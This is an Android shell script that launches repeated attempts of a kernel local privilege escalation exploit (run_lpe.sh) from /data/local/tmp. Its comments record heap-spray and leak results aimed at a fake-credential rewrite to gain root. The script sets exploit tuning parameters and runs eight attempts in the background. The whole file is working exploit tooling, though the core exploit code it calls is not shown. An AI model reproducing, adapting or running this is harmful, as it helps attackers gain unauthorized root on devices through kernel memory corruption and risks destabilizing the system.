#!/system/bin/sh
# run16: same as run15 (pageset gate), but several attempts in one run.
#
# run15 proved the gate: post-drop count 1186 -> 1352 (no drain), the spray
# took the pageset pages, and the reap wrote into our psl -- "[mcast] LEAK"
# instead of a panic -- for the first time.  The leak landed on L=0x18
# (posix slot k=20), one of the 24 unsupported offsets, so the attempt
# parked; only 7 of the 31 slots can carry the fake-cred rewrite.  Run the
# same configuration with more attempts to hit a supported slot.
#
# Each parked attempt keeps its psl sockets open until reboot (never kill -9),
# so reboot after the run before starting another one.
cd /data/local/tmp || exit 1
rm -f ic-run16.log
IC_SLABTRACE=1 IC_PAD_ALIGN=1 IC_SPRAY_EARLY=1 IC_EARLY_WAIT=1 \
IC_EARLY_PRIME=1024 IC_EARLY_GATE=1 IC_SKB_SOCKS=8 \
IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=8 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run16.log 2>&1 &
exit 0
